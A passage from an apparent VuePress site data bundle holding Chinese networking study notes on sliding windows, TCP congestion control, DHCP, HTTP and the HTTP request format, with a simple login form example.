发送窗口中是允许发送的序号。发送窗口的大小表示的是发送方可以连续发送的分组个数。\n\n接收方使用接收窗口，表示位于接口窗口内的分组允许接收\n\n接收方一般采用累积确认的方式。即不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认，这样就表示：到这个分组为止的所有分组都已正确收到了。\n\ngo-back-n（回退 n），表示需要再退回来重传已发送过的 n 个分组。\n\n> 例如：如果发送方发送了前 5 个分组，而中间的第 3 个分组丢失了。这时接收方只能对前两个分组发出确认。发送方要把后面的三个分组(3,4,5)都再重传一次。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"TCP_ 拥塞控制",frontmatter:{title:"TCP_ 拥塞控制",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/212921/",categories:["网络","网络原理","传输层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/04.%E4%BC%A0%E8%BE%93%E5%B1%82/08.TCP_%20%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6.html",relativePath:"06.网络/02.网络原理/04.传输层/08.TCP_ 拥塞控制.md",key:"v-229750bf",path:"/pages/212921/",headers:[{level:2,title:"慢开始",slug:"慢开始",normalizedTitle:"慢开始",charIndex:691},{level:2,title:"拥塞避免",slug:"拥塞避免",normalizedTitle:"拥塞避免",charIndex:770},{level:2,title:"当网络出现拥塞时",slug:"当网络出现拥塞时",normalizedTitle:"当网络出现拥塞时",charIndex:1151},{level:2,title:"快重传",slug:"快重传",normalizedTitle:"快重传",charIndex:1270},{level:2,title:"快恢复",slug:"快恢复",normalizedTitle:"快恢复",charIndex:1396}],headersStr:"慢开始 拥塞避免 当网络出现拥塞时 快重传 快恢复",content:"在某段时间，若对网络中某资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏——产生拥塞。\n\n出现资源拥塞的条件：$\\sum 对资源的需求 > 可用资源$\n\n> Q:任意增加一些资源，例如,把结点缓存的存储空间扩大,或把链路更换为更高速度的链路,或把结点处理机的运算速度提高,是否就可以解决网络拥塞的问题?\n> \n> A:不能。 因为网络拥塞是一个非常复杂的问题。简单地采用上述做法，在许多情况下，不但不能解决拥塞问题，而且还可能使网络的性能更坏。\n\n\n# 拥塞控制需要付出代价。\n\n一般在检测到拥塞发生时，要将拥塞发生的信息传送到产生分组的源站。通知拥塞发生的分组同样会使网络更加拥塞。 另一种方法是在路由器转发的分组中保留一个比特或字段，用该比特或字段的值表示没有拥塞或产生了拥塞。也可以由一些主机或路由器周期性地发出探测分组，以询问拥塞是否发生。\n\n\n# 拥塞控制和流量控制的关系\n\n拥塞控制是全局性的，为了保证资源够用，而流量控制是点对点\n\n> 例1： 光纤网络的链路传输速率为1000Gb/s。一个巨型计算机 向一个PC机以1Gb/s的速率传送文件。\n> \n> 需要流量控制,网络完全可以满足使用，但是计算机可能不能够这么快的处理数据，所以需要流量控制\n\n> 例2： 网络链路传输速率为1Mb/s，连接1000台大型计算机。 其中500台计算机向另外的500台以100Kb/s的速率发送文件。\n> \n> 需要拥塞控制，如果同时使用则会有50M的流量需求，网络链路无法满足，所以需要拥塞控制\n\n\n# 拥塞控制算法\n\n流程图\n\n\n\ncwnd拥塞窗口 ssthresh 慢开始门限状态变量\n\n> 当 cwnd < ssthresh 时，使用慢开始算法。\n> \n> 当 cwnd > ssthresh 时，停止使用慢开始算法而改用拥塞避免算法。\n> \n> 当 cwnd = ssthresh 时，既可使用慢开始算法，也可使用拥塞避免算法。\n\n\n# 慢开始\n\n 1. 在主机刚刚开始发送报文段时可先设置拥塞窗口 cwnd = 1\n\n 2. 在每收到一个对新的报文段的确认后， 将拥塞窗口加 1\n    \n    > 最后的效果是加倍\n    > \n    > \n    > \n    > 第一个轮次发送1个报文，接收到1个报文确认，cwnd+1=2\n    > \n    > 第二个轮次发送2个报文，接收到2个报文确认，cwnd+2=4\n    > \n    > ······\n    > \n    > 以此类推，每次都是原先的2倍\n\n\n# 拥塞避免\n\n慢开始是对每个确认，cwnd+1，也就是每个轮次是上一个轮次的2倍\n\n而拥塞避免算法是每一个轮次,cwnd是上一个轮次cwnd+1\n\n\n# 当网络出现拥塞时\n\n无论在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞（重传定时器超时）执行以下操作：\n\nssthresh = max(cwnd/2， 2)\ncwnd = 1\n执行慢开始算法  \n\n\n1\n2\n3\n\n\n\n\n\n# 快重传\n\n快重传算法要求接收方每收到一个失序的报文段后就立即发出重复确认。 这样做可以让发送方及早知道有报文段没有到达接收方， 而不要等待自己发送数据时才进行捎带确认。\n\n发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。\n\n\n\n\n# 快恢复\n\n当发送端收到连续三个重复的确认时,由于发送方现在认为网络很可能没有发生拥塞,因此现在不执行慢开始算法,而是执行快恢复算法:\n\n慢开始门限 ssthresh =当前拥塞窗口cwnd / 2 ;\n新拥塞窗口cwnd =慢开始门限ssthresh;\n开始执行拥塞避免算法,使拥塞窗口缓慢地线性增大。\n\n\n1\n2\n3\n\n\n\n\n在序号4 当拥塞窗口cwnd = 16时， 就是发送方一连收到3个对同一个报文段的重复确认(图中记为3-ACK） 则发送方改为执行快重传和快恢复算法。",normalizedContent:"在某段时间，若对网络中某资源的需求超过了该资源所能提供的可用部分，网络的性能就要变坏——产生拥塞。\n\n出现资源拥塞的条件：$\\sum 对资源的需求 > 可用资源$\n\n> q:任意增加一些资源，例如,把结点缓存的存储空间扩大,或把链路更换为更高速度的链路,或把结点处理机的运算速度提高,是否就可以解决网络拥塞的问题?\n> \n> a:不能。 因为网络拥塞是一个非常复杂的问题。简单地采用上述做法，在许多情况下，不但不能解决拥塞问题，而且还可能使网络的性能更坏。\n\n\n# 拥塞控制需要付出代价。\n\n一般在检测到拥塞发生时，要将拥塞发生的信息传送到产生分组的源站。通知拥塞发生的分组同样会使网络更加拥塞。 另一种方法是在路由器转发的分组中保留一个比特或字段，用该比特或字段的值表示没有拥塞或产生了拥塞。也可以由一些主机或路由器周期性地发出探测分组，以询问拥塞是否发生。\n\n\n# 拥塞控制和流量控制的关系\n\n拥塞控制是全局性的，为了保证资源够用，而流量控制是点对点\n\n> 例1： 光纤网络的链路传输速率为1000gb/s。一个巨型计算机 向一个pc机以1gb/s的速率传送文件。\n> \n> 需要流量控制,网络完全可以满足使用，但是计算机可能不能够这么快的处理数据，所以需要流量控制\n\n> 例2： 网络链路传输速率为1mb/s，连接1000台大型计算机。 其中500台计算机向另外的500台以100kb/s的速率发送文件。\n> \n> 需要拥塞控制，如果同时使用则会有50m的流量需求，网络链路无法满足，所以需要拥塞控制\n\n\n# 拥塞控制算法\n\n流程图\n\n\n\ncwnd拥塞窗口 ssthresh 慢开始门限状态变量\n\n> 当 cwnd < ssthresh 时，使用慢开始算法。\n> \n> 当 cwnd > ssthresh 时，停止使用慢开始算法而改用拥塞避免算法。\n> \n> 当 cwnd = ssthresh 时，既可使用慢开始算法，也可使用拥塞避免算法。\n\n\n# 慢开始\n\n 1. 在主机刚刚开始发送报文段时可先设置拥塞窗口 cwnd = 1\n\n 2. 在每收到一个对新的报文段的确认后， 将拥塞窗口加 1\n    \n    > 最后的效果是加倍\n    > \n    > \n    > \n    > 第一个轮次发送1个报文，接收到1个报文确认，cwnd+1=2\n    > \n    > 第二个轮次发送2个报文，接收到2个报文确认，cwnd+2=4\n    > \n    > ······\n    > \n    > 以此类推，每次都是原先的2倍\n\n\n# 拥塞避免\n\n慢开始是对每个确认，cwnd+1，也就是每个轮次是上一个轮次的2倍\n\n而拥塞避免算法是每一个轮次,cwnd是上一个轮次cwnd+1\n\n\n# 当网络出现拥塞时\n\n无论在慢开始阶段还是在拥塞避免阶段，只要发送方判断网络出现拥塞（重传定时器超时）执行以下操作：\n\nssthresh = max(cwnd/2， 2)\ncwnd = 1\n执行慢开始算法  \n\n\n1\n2\n3\n\n\n\n\n\n# 快重传\n\n快重传算法要求接收方每收到一个失序的报文段后就立即发出重复确认。 这样做可以让发送方及早知道有报文段没有到达接收方， 而不要等待自己发送数据时才进行捎带确认。\n\n发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。\n\n\n\n\n# 快恢复\n\n当发送端收到连续三个重复的确认时,由于发送方现在认为网络很可能没有发生拥塞,因此现在不执行慢开始算法,而是执行快恢复算法:\n\n慢开始门限 ssthresh =当前拥塞窗口cwnd / 2 ;\n新拥塞窗口cwnd =慢开始门限ssthresh;\n开始执行拥塞避免算法,使拥塞窗口缓慢地线性增大。\n\n\n1\n2\n3\n\n\n\n\n在序号4 当拥塞窗口cwnd = 16时， 就是发送方一连收到3个对同一个报文段的重复确认(图中记为3-ack） 则发送方改为执行快重传和快恢复算法。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"动态主机配置协议DHCP",frontmatter:{title:"动态主机配置协议DHCP",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/243302/",categories:["网络","网络原理","应用层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/05.%E5%BA%94%E7%94%A8%E5%B1%82/01.%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP.html",relativePath:"06.网络/02.网络原理/05.应用层/01.动态主机配置协议DHCP.md",key:"v-65577248",path:"/pages/243302/",headers:[{level:2,title:"手工分派",slug:"手工分派",normalizedTitle:"手工分派",charIndex:400},{level:2,title:"自动分配",slug:"自动分配",normalizedTitle:"自动分配",charIndex:431},{level:2,title:"动态分配",slug:"动态分配",normalizedTitle:"动态分配",charIndex:480},{level:2,title:"发现阶段",slug:"发现阶段",normalizedTitle:"发现阶段",charIndex:751},{level:2,title:"提供阶段",slug:"提供阶段",normalizedTitle:"提供阶段",charIndex:904},{level:2,title:"选择阶段",slug:"选择阶段",normalizedTitle:"选择阶段",charIndex:1004},{level:2,title:"确认阶段",slug:"确认阶段",normalizedTitle:"确认阶段",charIndex:1183},{level:2,title:"重新登录",slug:"重新登录",normalizedTitle:"重新登录",charIndex:1319},{level:2,title:"更新租约",slug:"更新租约",normalizedTitle:"更新租约",charIndex:1596}],headersStr:"手工分派 自动分配 动态分配 发现阶段 提供阶段 选择阶段 确认阶段 重新登录 更新租约",content:"动态主机配置协议DHCP （Dynamic Host ConfigurationProtocol）是一种动态的，向网络终端提供配置参数的协议。\n\nDHCP提供了即插即用连网（plug-and-play networking）的机制。允许一台计算机加入新的网络和获取IP地址时，不需手动配置。终端提出申请之后， DHCP可以向终端提供IP地址、网关、 DNS服务器地址等参数，并进行设置。\n\nDHCP采用客户/服务器模式\n\n\n\nDHCP 服务器先在其数据库中查找该计算机的配置信息。若找到，则返回找到的信息；若找不到，则要用到IP地址池。 DHCP服务器拥有一个IP地址池，当任何启用DHCP的客户端登录到网络时，可从它那里租借一个IP地址，不使用的IP地址就自动返回地址池，供再分配。 由于DHCP使用传输层协议UDP，所以DHCP的各类报文均被封装在UDP数据报中。\n\n\n# 分配地址方式\n\n\n# 手工分派\n\n由网络管理员为少数主机指定固定IP地址。\n\n\n# 自动分配\n\nDHCP为首次接入网络的某些主机分配固定IP地址，且该地址由此主机长期使用。\n\n\n# 动态分配\n\n以“租借”的方式为客户端分配地址，每个地址有一定的租约期限，到期须重新申请或续约\n\n\n# DHCP报文种类\n\n\n\n\n# DHCP中继代理（Relay Agent）\n\nDHCP中继代理，就是在DHCP服务器和客户端之间转发DHCP数据包。\n\n现在是每个网络至少有一个 DHCP 中继代理，它配置了DHCP 服务器的 IP 地址信息。DHCP 中继代理以单播方式向 DHCP 服务器转发DHCP发现报文，并等待其回答。收到 DHCP 服务器回答的提供报文后， DHCP 中继代理再将此提供报文发回给主机\n\n\n\n\n# 工作流程\n\n\n# 发现阶段\n\nDHCP客户机寻找DHCP服务器的阶段\n\n\n\n 1. 当DHCP客户端第一次登录网络时， 若本机没有IP地址设定，就以广播方式发送DHCP DISCOVER报文来寻找DHCP服务器\n 2. 网络上每一台安装了TCP/IP协议的主机都会接收这个广播信息，但只有DHCP服务器才会做出响应\n\n\n# 提供阶段\n\nDHCP服务器提供IP地址的阶段\n\n\n\n接收到DHCP DISCOVER报文后， DHCP服务器会向DHCP客户机发送一个包含出租的IP地址和其他设置的DHCP OFFER报文。\n\n\n# 选择阶段\n\nDHCP客户机选择IP地址的阶段\n\n\n\n如果有多台DHCP服务器向DHCP客户机发来DHCP OFFER报文，则DHCP客户机只接受第一个收到的DHCP OFFER报文;DHCP客户机以广播的方式回答DHCP REQUEST请求报文。之所以要以广播方式回答，就是为了通知所有的DHCP服务器，它将选择某台DHCP服务器所提供的IP地址。\n\n\n# 确认阶段\n\nDHCP服务器确认所提供的IP地址的阶段\n\n\n\n收到客户端的REQUEST报文后， DHCP服务器便返回一个DHCPACK报文，告诉DHCP客户端可以使用它提供的IP地址。除了DHCP客户端选中的服务器外，其他的DHCP服务器将收回曾经提供的IP地址\n\n\n# 重新登录\n\n\n\nDHCP客户端每次重新登录网络时，就不再发送DISCOVER报文，而是直接发送包含前一次所分配的IP地址的REQUEST报文。当DHCP服务器收到这一信息后，它会尝试让DHCP客户端继续使用原来的IP地址，并回答一个DHCPACK信息。\n\n\n\n如果此IP地址已无法再分配给原来的DHCP客户端时（例如，此IP地址已经分配给其他DHCP客户端使用），则DHCP服务器给客户机回答一个DHCP NACK否认信息。当原来的DHCP客户端收到此DHCP NACK信息后，它就必须重新发送DHCP DISCOVER信息来请求新的IP地址。\n\n\n# 更新租约\n\nIP地址的租约期满后， DHCP服务器便会收回出租的IP地址。如果DHCP客户端要延长其IP租约，则必须更新其IP租约。当客户端**重新启动或租约到50%时， DHCP客户端就需要直接向提供租约的服务器发送DHCP REQUEST包， 更新客户端租约。如客户端与服务器无法联系，则客户端等到租约到达87.5%**时，进入重新申请状态。",normalizedContent:"动态主机配置协议dhcp （dynamic host configurationprotocol）是一种动态的，向网络终端提供配置参数的协议。\n\ndhcp提供了即插即用连网（plug-and-play networking）的机制。允许一台计算机加入新的网络和获取ip地址时，不需手动配置。终端提出申请之后， dhcp可以向终端提供ip地址、网关、 dns服务器地址等参数，并进行设置。\n\ndhcp采用客户/服务器模式\n\n\n\ndhcp 服务器先在其数据库中查找该计算机的配置信息。若找到，则返回找到的信息；若找不到，则要用到ip地址池。 dhcp服务器拥有一个ip地址池，当任何启用dhcp的客户端登录到网络时，可从它那里租借一个ip地址，不使用的ip地址就自动返回地址池，供再分配。 由于dhcp使用传输层协议udp，所以dhcp的各类报文均被封装在udp数据报中。\n\n\n# 分配地址方式\n\n\n# 手工分派\n\n由网络管理员为少数主机指定固定ip地址。\n\n\n# 自动分配\n\ndhcp为首次接入网络的某些主机分配固定ip地址，且该地址由此主机长期使用。\n\n\n# 动态分配\n\n以“租借”的方式为客户端分配地址，每个地址有一定的租约期限，到期须重新申请或续约\n\n\n# dhcp报文种类\n\n\n\n\n# dhcp中继代理（relay agent）\n\ndhcp中继代理，就是在dhcp服务器和客户端之间转发dhcp数据包。\n\n现在是每个网络至少有一个 dhcp 中继代理，它配置了dhcp 服务器的 ip 地址信息。dhcp 中继代理以单播方式向 dhcp 服务器转发dhcp发现报文，并等待其回答。收到 dhcp 服务器回答的提供报文后， dhcp 中继代理再将此提供报文发回给主机\n\n\n\n\n# 工作流程\n\n\n# 发现阶段\n\ndhcp客户机寻找dhcp服务器的阶段\n\n\n\n 1. 当dhcp客户端第一次登录网络时， 若本机没有ip地址设定，就以广播方式发送dhcp discover报文来寻找dhcp服务器\n 2. 网络上每一台安装了tcp/ip协议的主机都会接收这个广播信息，但只有dhcp服务器才会做出响应\n\n\n# 提供阶段\n\ndhcp服务器提供ip地址的阶段\n\n\n\n接收到dhcp discover报文后， dhcp服务器会向dhcp客户机发送一个包含出租的ip地址和其他设置的dhcp offer报文。\n\n\n# 选择阶段\n\ndhcp客户机选择ip地址的阶段\n\n\n\n如果有多台dhcp服务器向dhcp客户机发来dhcp offer报文，则dhcp客户机只接受第一个收到的dhcp offer报文;dhcp客户机以广播的方式回答dhcp request请求报文。之所以要以广播方式回答，就是为了通知所有的dhcp服务器，它将选择某台dhcp服务器所提供的ip地址。\n\n\n# 确认阶段\n\ndhcp服务器确认所提供的ip地址的阶段\n\n\n\n收到客户端的request报文后， dhcp服务器便返回一个dhcpack报文，告诉dhcp客户端可以使用它提供的ip地址。除了dhcp客户端选中的服务器外，其他的dhcp服务器将收回曾经提供的ip地址\n\n\n# 重新登录\n\n\n\ndhcp客户端每次重新登录网络时，就不再发送discover报文，而是直接发送包含前一次所分配的ip地址的request报文。当dhcp服务器收到这一信息后，它会尝试让dhcp客户端继续使用原来的ip地址，并回答一个dhcpack信息。\n\n\n\n如果此ip地址已无法再分配给原来的dhcp客户端时（例如，此ip地址已经分配给其他dhcp客户端使用），则dhcp服务器给客户机回答一个dhcp nack否认信息。当原来的dhcp客户端收到此dhcp nack信息后，它就必须重新发送dhcp discover信息来请求新的ip地址。\n\n\n# 更新租约\n\nip地址的租约期满后， dhcp服务器便会收回出租的ip地址。如果dhcp客户端要延长其ip租约，则必须更新其ip租约。当客户端**重新启动或租约到50%时， dhcp客户端就需要直接向提供租约的服务器发送dhcp request包， 更新客户端租约。如客户端与服务器无法联系，则客户端等到租约到达87.5%**时，进入重新申请状态。",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"HTTP协议",frontmatter:{title:"HTTP协议",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/18fbb4/",categories:["网络","网络原理","应用层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/05.%E5%BA%94%E7%94%A8%E5%B1%82/03.HTTP%E5%8D%8F%E8%AE%AE.html",relativePath:"06.网络/02.网络原理/05.应用层/03.HTTP协议.md",key:"v-4a3bc8a9",path:"/pages/18fbb4/",headers:[{level:2,title:"HTTP/1.0",slug:"http-1-0",normalizedTitle:"http/1.0",charIndex:402},{level:2,title:"HTTP/1.1",slug:"http-1-1",normalizedTitle:"http/1.1",charIndex:520}],headersStr:"HTTP/1.0 HTTP/1.1",content:"超文本传送协议HTTP定义了浏览器怎样向万维网服务器请求万维网文档， 以及服务器怎样把文档传送给浏览器。\n\nHTTP协议使用了面向连接的TCP作为运输层协议， 保证了数据的可靠传输。\n\n> 用户点击鼠标后所发生的事件\n> \n>  1. 浏览器分析超链指向页面的 URL。\n>  2. 浏览器向 DNS 请求解析 www.tsinghua.edu.cn 的 IP 地址。\n>  3. 域名系统 DNS 解析出清华大学服务器的 IP 地址。\n>  4. 浏览器与服务器建立 TCP 连接\n>  5. 浏览器发出取文件命令：\n>  6. 服务器给出响应， 把指定路径下的文件 发给浏览器。\n>  7. TCP 连接释放。\n>  8. 浏览器显示指定页面的内容。\n\n\n# 请求一个万维网文档所需的时间\n\n请求一个万维网文档所需的时间：$该文档的传输时间+2*往返时间RTT$。\n\n\n\n\n# http版本\n\n\n# HTTP/1.0\n\nHTTP/1.0协议是无状态的。 服务器并不记录曾经访问过的客户信息。 从而简化服务器的设计， 使服务器更容易支持大量并发的HTTP请求。\n\nHTTP/1.0协议使用非持续连接， 增加了万维网服务器的负担。\n\n\n# HTTP/1.1\n\nHTTP/1.1 协议使用持续连接\n\n万维网服务器在发送响应后仍然在一段时间内保持这条连接，使同一个客户（浏览器）和该服务器可以继续在这条连接上传送后续的 HTTP 请求报文和响应报文。\n\n并不局限于传送同一个页面上链接的文档，而是只要这些文档都在同一个服务器上就行。\n\n> 持续连接的两种工作方式\n> \n> 非流水线方式：客户在收到前一个响应后才能发出下一个请求。这比非持续连接的两倍 RTT 的开销节省了建立 TCP 连接所需的一个 RTT 时间。\n> \n> 流水线方式：客户在收到 HTTP 的响应报文之前就能够接着发送新的请求报文。一个接一个的请求报文到达服务器后，服务器就可连续发回响应报文。使用流水线方式时，客户访问所有的对象只需花费一个 RTT时间。\n\n\n# 请求报文\n\n从客户向服务器发送请求报文。\n\n\n\n方法：请求方式，如get,post等 http请求报文详解\n\n\n# 响应报文\n\n从服务器到客户的回答。\n\n\n\n状态码 : 200 404等等 http响应报文详解",normalizedContent:"超文本传送协议http定义了浏览器怎样向万维网服务器请求万维网文档， 以及服务器怎样把文档传送给浏览器。\n\nhttp协议使用了面向连接的tcp作为运输层协议， 保证了数据的可靠传输。\n\n> 用户点击鼠标后所发生的事件\n> \n>  1. 浏览器分析超链指向页面的 url。\n>  2. 浏览器向 dns 请求解析 www.tsinghua.edu.cn 的 ip 地址。\n>  3. 域名系统 dns 解析出清华大学服务器的 ip 地址。\n>  4. 浏览器与服务器建立 tcp 连接\n>  5. 浏览器发出取文件命令：\n>  6. 服务器给出响应， 把指定路径下的文件 发给浏览器。\n>  7. tcp 连接释放。\n>  8. 浏览器显示指定页面的内容。\n\n\n# 请求一个万维网文档所需的时间\n\n请求一个万维网文档所需的时间：$该文档的传输时间+2*往返时间rtt$。\n\n\n\n\n# http版本\n\n\n# http/1.0\n\nhttp/1.0协议是无状态的。 服务器并不记录曾经访问过的客户信息。 从而简化服务器的设计， 使服务器更容易支持大量并发的http请求。\n\nhttp/1.0协议使用非持续连接， 增加了万维网服务器的负担。\n\n\n# http/1.1\n\nhttp/1.1 协议使用持续连接\n\n万维网服务器在发送响应后仍然在一段时间内保持这条连接，使同一个客户（浏览器）和该服务器可以继续在这条连接上传送后续的 http 请求报文和响应报文。\n\n并不局限于传送同一个页面上链接的文档，而是只要这些文档都在同一个服务器上就行。\n\n> 持续连接的两种工作方式\n> \n> 非流水线方式：客户在收到前一个响应后才能发出下一个请求。这比非持续连接的两倍 rtt 的开销节省了建立 tcp 连接所需的一个 rtt 时间。\n> \n> 流水线方式：客户在收到 http 的响应报文之前就能够接着发送新的请求报文。一个接一个的请求报文到达服务器后，服务器就可连续发回响应报文。使用流水线方式时，客户访问所有的对象只需花费一个 rtt时间。\n\n\n# 请求报文\n\n从客户向服务器发送请求报文。\n\n\n\n方法：请求方式，如get,post等 http请求报文详解\n\n\n# 响应报文\n\n从服务器到客户的回答。\n\n\n\n状态码 : 200 404等等 http响应报文详解",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"统一资源定位符",frontmatter:{title:"统一资源定位符",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/b279d0/",categories:["网络","网络原理","应用层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/05.%E5%BA%94%E7%94%A8%E5%B1%82/02.%E7%BB%9F%E4%B8%80%E8%B5%84%E6%BA%90%E5%AE%9A%E4%BD%8D%E7%AC%A6.html",relativePath:"06.网络/02.网络原理/05.应用层/02.统一资源定位符.md",key:"v-149e68a1",path:"/pages/b279d0/",headersStr:null,content:"统一资源定位符 URL (Uniform Resource Locator) 用来标志万维网上的各种文档。每一个文档在整个互联网的范围内具有唯一的标识符 URL。\n\nURL格式：`<协议>://<主机>:<端口>/<路径>",normalizedContent:"统一资源定位符 url (uniform resource locator) 用来标志万维网上的各种文档。每一个文档在整个互联网的范围内具有唯一的标识符 url。\n\nurl格式：`<协议>://<主机>:<端口>/<路径>",charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"http请求报文详解",frontmatter:{title:"http请求报文详解",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/ea178c/",categories:["网络","网络原理","应用层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/05.%E5%BA%94%E7%94%A8%E5%B1%82/04.http%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87%E8%AF%A6%E8%A7%A3.html",relativePath:"06.网络/02.网络原理/05.应用层/04.http请求报文详解.md",key:"v-d61e2576",path:"/pages/ea178c/",headersStr:null,content:'HTTP请求报文：由客户端向服务器端发出的报文。\n\nHTTP请求报文格式：包含请求行、请求头、空行、请求体 四个部分\n\n\n\n\n# 请求行\n\n例如：POST /web01/login.html HTTP/1.1\n请求行必须在HTTP请求格式的第一行。\n请求行格式：请求方式 资源路径 协议/版本\n\n请求方式：协议规定7种，常用两种：GET和POST\n\tGET请求：\n\t\t将请求参数追加在URL后面，不安全。例如：login.html?username=tom&password=1234\n\t\tURL长度限制GET请求方式的数据大小。\n\t\t没有请求体\n\tPOST请求\n\t\t请求参数显示请求体处，较安全。\n\t\t请求数据大小没有显示。\n\t只有表单设置为method=”post”才是post请求.其他的都是get请求。\n\t常见GET请求：地址栏直接访问、<a href=””>、<img src=””> 等\n\t\t\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 请求头\n\n请求头: 描述了客户端向服务器发送请求时使用的http协议类型，所使用的编码，以及发送内容的长度，referer，等等。\n\n请求头也是用的键值对key:value\n\n常见请求头        描述\nReferer      浏览器通知服务器，当前请求来自何处。如果是直接访问，则不会有这个头。常用于：防盗链\nCookie       与会话有关技术，用于存放浏览器缓存的cookie信息。\nUser-Agent   浏览器通知服务器，客户端浏览器与操作系统相关信息\n\n\n# 请求体\n\n通常情况下，只有post请求方式才会使用到请求体，请求体中都是用户表单提交的数据，每一项数据都使用键值对key=value，多组值使用&相连。\n\t例如；username=tom&password=1234\n\n\n1\n2\n\n\n\n# Http请求报文演示\n\n * 创建页面，编写“login.html”，并提供表单，分别设置表单的提交方式为：get和post。将表单提交位置设置成#，表示提交到当前表单。\n   \n   \n\n<form action="#" method="post">\n    用户名：<input type="text" name="username" value=""/> <br/>\n    密　码：<input type="text" name="password" value=""/> <br/>\n    <input type="submit" />\n</form>\n\n\n\n1\n2\n3\n4\n5\n6\n\n\n观看下图，我们采用GET请求方式、POST请求方式的抓包结果：（Chrome浏览器）\n\n * GET请求抓包数据：\n   \n   \n\n * POST请求抓包数据：\n   \n   ',normalizedContent:'http请求报文：由客户端向服务器端发出的报文。\n\nhttp请求报文格式：包含请求行、请求头、空行、请求体 四个部分\n\n\n\n\n# 请求行\n\n例如：post /web01/login.html http/1.1\n请求行必须在http请求格式的第一行。\n请求行格式：请求方式 资源路径 协议/版本\n\n请求方式：协议规定7种，常用两种：get和post\n\tget请求：\n\t\t将请求参数追加在url后面，不安全。例如：login.html?username=tom&password=1234\n\t\turl长度限制get请求方式的数据大小。\n\t\t没有请求体\n\tpost请求\n\t\t请求参数显示请求体处，较安全。\n\t\t请求数据大小没有显示。\n\t只有表单设置为method=”post”才是post请求.其他的都是get请求。\n\t常见get请求：地址栏直接访问、<a href=””>、<img src=””> 等\n\t\t\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 请求头\n\n请求头: 描述了客户端向服务器发送请求时使用的http协议类型，所使用的编码，以及发送内容的长度，referer，等等。\n\n请求头也是用的键值对key:value\n\n常见请求头        描述\nreferer      浏览器通知服务器，当前请求来自何处。如果是直接访问，则不会有这个头。常用于：防盗链\ncookie       与会话有关技术，用于存放浏览器缓存的cookie信息。\nuser-agent   浏览器通知服务器，客户端浏览器与操作系统相关信息\n\n\n# 请求体\n\n通常情况下，只有post请求方式才会使用到请求体，请求体中都是用户表单提交的数据，每一项数据都使用键值对key=value，多组值使用&相连。\n\t例如；username=tom&password=1234\n\n\n1\n2\n\n\n\n# http请求报文演示\n\n * 创建页面，编写“login.html”，并提供表单，分别设置表单的提交方式为：get和post。将表单提交位置设置成#，表示提交到当前表单。\n   \n   \n\n<form action="#" method="post">\n    用户名：<input type="text" name="username" value=""/> <br/>\n    密　码：<input type="text" name="password" value=""/> <br/>\n    <input type="submit" />\n</form>\n\n\n\n1\n2\n3\n4\n5\n6\n\n\n观看下图，我们采用get请求方式、post请求方式的抓包结果：（chrome浏览器）\n\n * get请求抓包数据：\n   \n   \n\n * post请求抓包数据：\n   \n   ',charsets:{cjk:!0},lastUpdated:"2022/04/19, 23:07:56",lastUpdatedTimestamp:1650380876e3},{title:"http响应报文详解",frontmatter:{title:"http响应报文详解",date:"2022-04-18T00:00:40.000Z",permalink:"/pages/616db0/",categories:["网络","网络原理","应用层"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/06.%E7%BD%91%E7%BB%9C/02.%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/05.%E5%BA%94%E7%94%A8%E5%B1%82/05.http%E5%93%8D%E5%BA%94%E6%8A%A5%E6%96%87%E8%AF%A6%E8%A7%A3.html",relativePath:"06.网络/02.网络原理/05.应用层/05.http响应报文详解.md",key:"v-6c629b3a",path:"/pages/616db0/",headersStr:null,content:'响应报文：从服务端到客户端的报文。\n\nHTTP响应报文格式：响应行、响应头、空行、响应体 四个部分\n\n\n\n\n# 响应行\n\n例如：HTTP/1.1 200 OK\n格式：协议/版本 状态码  状态码描述\n\t状态码：服务器与浏览器用于确定状态的固定数字号码\n\t\t200 ：请求成功。\n\t\t302 ：请求重定向。\n\t\t304 ：请求资源没有改变，访问本地缓存。\n\t\t404 